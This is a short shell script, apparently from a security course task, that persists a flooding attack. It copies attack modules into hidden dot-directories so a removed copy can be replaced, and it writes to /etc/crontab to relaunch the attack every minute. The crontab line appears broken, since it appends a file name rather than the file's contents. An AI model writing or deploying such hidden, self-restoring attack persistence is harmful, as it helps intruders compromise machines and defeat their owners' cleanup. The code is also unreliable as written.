# task2
# replication attack file to two hidden files
Hidden1="../../.etc/.qq"
mkdir -p $Hidden1
cp ./Infect/Flooding_Attack $Hidden1
cp ./Infect/Check_Attack $Hidden1
cp ./Infect/Launching_Attack $Hidden1

Hidden2="../../.Launch_Attack"
mkdir -p $Hidden2
cp ./Infect/Launching_Attack $Hidden2

# When one of attack modules is removed, the attack can still be launched by the other
echo ./crontab.txt >> /etc/crontab
# trigger automatically every 1 minute, if it is not running
